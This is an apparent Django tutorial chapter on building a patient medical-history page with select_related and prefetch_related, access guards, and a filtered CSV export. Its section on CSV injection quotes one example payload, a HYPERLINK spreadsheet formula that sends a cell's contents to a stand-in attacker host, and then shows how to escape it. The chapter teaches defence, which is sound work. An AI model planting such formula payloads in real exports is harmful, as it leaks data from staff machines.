# Step 19c–19d — Medical history (`prefetch_related`) + CSV export

Every page in this project so far showed **one slice**: this patient's appointments, this appointment's prescription, this patient's lab tests. Three separate pages, three separate trips.

A doctor mid-consult doesn't want three pages. They want one: *what has happened to this person?* Visits, what was diagnosed, what was prescribed, what the lab found — in order, on one screen.

That's a different shape of query. Not "give me rows", not "give me numbers about rows" (19a), but **give me rows and everything hanging off them**.

---

## 1. The hospital records-room analogy

You're a doctor. A patient sits down. You need their file.

**Way one — the runner.** You ask a clerk for the visit list. They come back with 20 visit slips. You read slip 1, ask "what was prescribed that day?" — the clerk walks to the records room and back. Slip 2, same walk. Then "what tests were run?" — another walk, per slip. Then "what did the test say?" — another walk, per test.

Twenty visits, four questions each. **Eighty walks.** The clerk is exhausted and the patient has been sitting there ten minutes. Each walk is short; there are just so many of them.

**Way two — the trolley.** You ask once: "bring me the visit list, plus every prescription for those visits, plus every test for those visits, plus every result for those tests." The clerk makes **three** trips with a trolley and drops the whole pile on your desk. You sort it on the desk — which costs nothing, because it's all already in front of you.

The pile is the same size either way. What changed is the **number of walks**, and the walk is the expensive part.

That second way is `select_related` and `prefetch_related`. The database is the records room, and every walk is a network round-trip.

---

## 2. Two loaders, two shapes

They solve the same problem — "fetch the related thing up front" — but they cannot be swapped, because they work in physically different ways.

### `select_related` — one query, JOINed

```python
.select_related('doctor', 'prescription')
```

**Plain meaning:** glue the related row's columns onto the row you're already reading.

SQL does this with a `JOIN`. One query comes back, and each appointment row arrives carrying the doctor's columns and the prescription's columns riding along in the same row.

That only works when the other side is **exactly one row**:

- **forward ForeignKey** — `appointment.doctor`. Many appointments, one doctor. From the appointment's side, one row. ✅
- **reverse OneToOne** — `appointment.prescription`. `Prescription` has the FK, but it's a `OneToOneField`, so at most one prescription exists per appointment. ✅

### `prefetch_related` — a second query, joined in Python

```python
.prefetch_related('lab_tests__result')
```

**Plain meaning:** run a separate query for the related rows, then Django matches them to their parents in memory.

Why it can't be a JOIN: one appointment can have **five** lab tests. A JOIN would have to repeat the appointment row five times to carry them — you'd ask for 20 appointments and get 60 rows back, and you'd have to un-duplicate them yourself. Django refuses that and runs a second query instead:

```sql
SELECT * FROM lab_test WHERE appointment_id IN (1, 2, 3, ...);
```

One query for **all** the tests of **all** the appointments, then Python hands each test to the right appointment.

| | `select_related` | `prefetch_related` |
|---|---|---|
| Use for | forward FK, reverse OneToOne | reverse FK, ManyToMany |
| How many rows the other side has | exactly one | many |
| Queries added | **0** (it's a JOIN) | **1 per span** |
| Joined where | in the database | in Python |

**Rule of thumb:** if the attribute reads naturally as `.all()`, it's `prefetch_related`. `appt.lab_tests.all` — many. `appt.doctor` — one.

---

## 3. The nested span: `lab_tests__result`

The double underscore is the same "follow the relation" span you already used in 19a's `values('doctor__username')`. Here it means: prefetch the tests, **then** prefetch those tests' results.

```python
.prefetch_related('lab_tests__result')
```

Django runs two queries for that one line:

1. all `LabTest` rows whose `appointment_id` is in our list
2. all `LabResult` rows whose `test_id` is in *those* tests

Notice `result` is a **OneToOne** — normally `select_related` territory. But it hangs off a list that was itself prefetched, so there's no single row to JOIN it onto. It rides in the prefetch.

You already met this exact span at 16e (`prefetch_related('lab_tests__result')` on the doctor's records page). Same tool, deeper page.

---

## 4. Stacking both on one queryset

They chain. Each one handles the relations it's shaped for:

```python
appointments = (
    Appointment.objects
    .filter(patient=patient)
    .select_related('doctor', 'prescription')
    .prefetch_related('lab_tests__result')
)
```

**Total: 3 queries.** One for appointments (with doctor + prescription JOINed in), one for tests, one for results.

And here's the part that matters: **3 is the number for 5 appointments and for 500.** The query count doesn't grow with the data. Without these two lines it's `1 + 4×N` — 81 queries for 20 visits.

**Why it matters:** this is the difference between a page that loads instantly and one that gets slower every month the patient keeps coming back.

---

## 5. One view, two URLs

The page has two audiences. A patient opens *their own* record. A doctor or receptionist opens *someone else's*. Same page, different question: whose?

A default value in the signature lets one view serve both:

```python
def medical_history(request, patient_id=None):
```

```python
path('history/', views.medical_history, name='medical_history'),
path('history/<int:patient_id>/', views.medical_history, name='patient_history'),
```

`history/` captures nothing, so `patient_id` keeps its default `None`. `history/12/` captures `12` and passes it in. **Two doors, one room.**

---

## 6. The view

```python
@login_required
def medical_history(request, patient_id=None):
    if patient_id is None:
        patient = request.user
    elif request.user.role in ('DOCTOR', 'RECEPTION'):
        patient = get_object_or_404(User, id=patient_id, role='PATIENT')
    else:
        raise Http404()

    appointments = (
        Appointment.objects
        .filter(patient=patient)
        .select_related('doctor', 'prescription')
        .prefetch_related('lab_tests__result')
    )

    return render(request, 'appointments/medical_history.html', {
        'patient': patient,
        'appointments': appointments,
    })
```

No ordering needed — `Appointment.Meta.ordering` is already `['-appointment_date', '-time_slot']`, so newest visit first comes free.

### Two guards, two different jobs

The moment a URL carries an id, anyone can type a different id. That's the IDOR surface, and this view closes it twice over:

```python
else:
    raise Http404()
```
→ **you** are not allowed through this door. A PATIENT typing `/history/3/` lands here.

```python
get_object_or_404(User, id=patient_id, role='PATIENT')
```
→ **the target** isn't a patient. `role='PATIENT'` is part of the *lookup*, not a check afterwards, so a doctor fishing for another doctor's id matches zero rows and gets a 404.

Worth being precise about which line fires: if a DOCTOR opens `/history/12/` and user 12 is another doctor, the `elif` is `True`, so `else` never runs. The 404 comes from the lookup. Same outcome, different guard — and only one of them protects against a patient guessing ids.

---

## 7. The template: nested, not tabular

Every list page so far was a `<table>`. This one isn't, and the reason is the data shape: a visit *contains* a prescription which *contains* medicines, and *contains* tests which *contain* results. Tables are flat. This is a tree.

One `<div class="visit">` per appointment, indented blocks inside.

### `{% if appt.prescription %}` doesn't crash

In Python, reading `appt.prescription` on an appointment that has none raises `RelatedObjectDoesNotExist`. In a **template** the same line is safe.

Django's template engine catches exceptions carrying a `silent_variable_failure = True` flag and renders an empty string instead. `ObjectDoesNotExist` carries it. So the `{% if %}` sees a falsy value and skips the block — no crash, no `getattr` dance.

### `appt.lab_tests.all` costs zero queries here

```django
{% for test in appt.lab_tests.all %}
```

That line *looks* like the N+1 you were just warned about. Inside a loop over appointments, `.all` per row is the textbook mistake.

It's free here — **because the view prefetched it**. `prefetch_related` already fetched every test and attached the list to each appointment object; `.all` reads the cached list without touching the database.

Which is the real lesson of 19c: **delete the prefetch line and this template doesn't change by one character, but the page starts firing 4×N queries.** Template performance is decided in the view. You cannot read a template and know what it costs.

---

## 8. Gotchas

### `appt.lab_test.all` — singular, and completely silent

```django
{% if appt.lab_test.all %}     ❌  related_name is 'lab_tests'
{% if appt.lab_tests.all %}    ✅
```

In Python this is an `AttributeError` that stops everything. In a template, a missing attribute renders as an empty string → falsy → **the entire Lab Tests block silently doesn't render**. The page loads, looks finished, and the tests just aren't there.

Third appearance of reverse-accessor singular/plural in this project (18c had `user.notification.all()`). The tell: the `{% for %}` two lines below said `lab_tests` correctly — the file disagreed with itself.

### `prescription:view` — namespace singular

`NoReverseMatch` at render. `check` never resolves URL names, so nothing warns you. Same bug as 18c's `prescription:write`, same fix: plural.

### `<storng>`

Second appearance (18c was the first). An unknown tag renders as plain inline text — no bold, no error, nothing in the console.

### An unclosed `{% if %}` is the *good* kind of bug

The advice block was typed with an opening `{% if appt.prescription.advice %}` and no `{% endif %}`, so the next `{% endif %}` closed the wrong tag and the outer `{% if %}` was left dangling → `TemplateSyntaxError`, with a line number.

Compare that to `lab_test` above. The loud bug cost a minute. The quiet ones ship to production looking correct. **That asymmetry is the whole reason the grep-list exists.**

### `patient_id` beats `patient.id`

```django
{% url 'appointments:patient_history' appt.patient_id %}
```

`patient_id` is the foreign-key column already sitting on the appointment row. `patient.id` follows the relation to the User table to read a number Django was already holding. Same output, one less lookup.

---

## 9. What we deliberately skipped

| Skipped | Why | Add when |
|---|---|---|
| A "History" column in the staff tables | The patient's name was already in the row — wrapping it in `<a>` is one line instead of four | never, probably |
| Date filters / pagination on the history | It's one person's visits, not the whole hospital. `prefetch_related` keeps it at 3 queries regardless | a patient passes ~50 visits |
| A separate `history` app | Zero new models. Reads `Appointment` — same reasoning as 19a's dashboard | it grows its own tables |
| Doctor-facing notes/edit on the page | It's a read-only record. Writing happens on the prescription and lab pages that already exist | never |

---
---

# 19d — CSV export

Reception wants the appointment list in a spreadsheet. Every page so far ended in `render()`, which builds an HTTP response full of HTML. Nothing says a response has to be HTML.

## 10. A response is just bytes plus two labels

```python
response = HttpResponse(content_type='text/csv')
response['Content-Disposition'] = f'attachment; filename="appointments-{timezone.localdate()}.csv"'
```

- `content_type` says **what** the bytes are.
- `Content-Disposition: attachment` says **don't display this — save it**, and `filename=` suggests a name.

Drop the second header and the browser shows the CSV as plain text in the tab. Same bytes, different behaviour — the headers are the whole difference between "a page" and "a download".

## 11. Why `csv.writer` accepts an HttpResponse

```python
writer = csv.writer(response)
writer.writerow(['Patient', 'Doctor', 'Date', 'Time', 'Status', 'Notes'])
```

`csv.writer` never asked for a file. It asks for **anything with a `.write()` method** — it calls `.write()` with a line of text and doesn't care where it goes. `HttpResponse` has `.write()`. So rows are written straight into the response body: nothing on disk, no temp file, no `open()`.

**Analogy:** you hand a courier an address. The courier doesn't check whether it's a house, an office, or a locker — it has a letterbox, that's enough. Python calls this a "file-like object": the *type* doesn't matter, the *method* does.

**Why it matters:** `csv` is standard library, so exporting cost **zero new dependencies**. That's why `.xlsx`/openpyxl was cut from Step 19 — Excel opens CSV fine, and openpyxl would have been a dependency bought for nothing.

## 12. One filter, two callers

`appointment_list` already had three filter blocks (status / doctor / date). The export needs **exactly the same** filtering — so it got extracted, not copy-pasted:

```python
def _filtered_appointments(request):
    appointments = (
        Appointment.objects
        .select_related('patient', 'doctor')
        .order_by('-appointment_date', '-time_slot')
    )
    status = request.GET.get('status')
    if status:
        appointments = appointments.filter(status=status)
    ...
    return appointments
```

Two things this buys:

1. **A future filter bug gets fixed once.** Copied code means the list page and the export drift apart, and nobody notices until an export disagrees with the screen it came from.
2. **The export inherits `select_related` for free.** Without it, `appt.patient.username` fires one query *per row* — 500 appointments = 1001 queries. The N+1 was solved by sharing, not by remembering.

Returning a **QuerySet is safe** here: it's lazy, so the helper hands back an unrun query and each caller finishes it its own way — one renders it, one writes it to CSV.

Leading `_` and no `@login_required`, because it's a helper, not a view — it never gets a URL. Same shape as `_redirect_after_action`.

## 13. The button that carries the filters

```django
<a href="{% url 'appointments:export_csv' %}?{{ request.GET.urlencode }}">Download CSV</a>
```

`request.GET.urlencode` rebuilds the current querystring, so a screen filtered to one doctor exports **that doctor's rows**. Without it the button always dumps everything — which reception reads as a bug, because the screen and the file disagree.

## 14. CSV injection — the export is a trust boundary

`Notes` and usernames are typed by users. Excel and LibreOffice treat any cell starting with `=`, `+`, `-`, or `@` as a **formula**, not text.

So a patient booking with notes like `=HYPERLINK("http://evil.site?d="&A1,"click")` writes a live formula into your file, and it runs on the receptionist's machine when they open it. The attacker never touches the server — they type in a form and wait for staff to open the export.

```python
def _csv_safe(value):
    text = str(value)
    if text.startswith(('=', '+', '-', '@')):
        return "'" + text
    return text
```

The leading `'` is Excel's "treat this as text" marker: the value displays normally and the formula never runs. Applied to the two user-typed columns only — dates, times, and status come from our own `TextChoices`, not from a user.

**The general shape:** escaping is per-destination. Django already escapes user input for **HTML**, and that did nothing for us here, because the danger this time was a *spreadsheet* reading the same characters differently. Whenever data leaves the app in a new format, its escaping has to be reconsidered from scratch.

## 15. Gotchas

### `request.GST.urlencode` — the export silently ignored every filter

```django
{{ request.GST.urlencode }}    ❌
{{ request.GET.urlencode }}    ✅
```

`request` has no attribute `GST`, so the template rendered an **empty string**. The href came out as `.../export/csv/?` with nothing after the `?`, `request.GET` arrived empty, all three `if` blocks were skipped, and the file contained every row in the database.

The view was never wrong — the querystring never left the page. **Third silent-template-name bug in one session** (`appt.lab_test`, 19a's `stats.completd`, now this), and they share a tell: the feature quietly does the *unfiltered* version of its job, which looks like working code until you read the output.

### `get_status_display()` needs its parentheses in Python

```python
appt.get_status_display()      # ✅ in a view
{{ appt.get_status_display }}  # ✅ in a template — Django calls it for you
```

Forget the `()` in Python and every CSV cell reads `<bound method ...>`. No exception, just a nonsense file.

---

## 16. What we deliberately skipped (19d)

| Skipped | Why | Add when |
|---|---|---|
| `.xlsx` / openpyxl | A new dependency to produce what Excel already opens | someone needs formulas or multiple sheets |
| Streaming (`StreamingHttpResponse`) | A clinic's appointment table fits in memory many times over | exports reach ~100k rows |
| A separate export for each page | Reception asked for the appointment list. That's the whole ask | someone asks |
| A background/Celery export job | It returns instantly at this size | the request starts timing out |

---

## Revise (3 lines)

1. **`select_related` = JOIN, for exactly-one relations** (forward FK, reverse OneToOne) and adds **zero** queries; **`prefetch_related` = a second query joined in Python**, for many-relations, because a JOIN would duplicate the parent row. If it reads as `.all()`, it's prefetch.
2. **Query count must not grow with row count.** `.select_related('doctor', 'prescription').prefetch_related('lab_tests__result')` is 3 queries for 5 visits and 3 for 500; without it, `1 + 4×N`.
3. **A template's cost is set in the view.** `{% for test in appt.lab_tests.all %}` is free with the prefetch and 4×N without it, and the template looks identical either way — so read the view before blaming the page.
4. **A response is bytes plus two headers** — `content_type` says what it is, `Content-Disposition: attachment` makes it a download; `csv.writer` accepts an `HttpResponse` because it only ever wanted something with `.write()`, so the export needed **zero new dependencies**.
5. **Escaping is per-destination.** Django escapes user input for HTML and that buys nothing in a CSV, where a leading `=` is a formula Excel will run on the receptionist's machine.
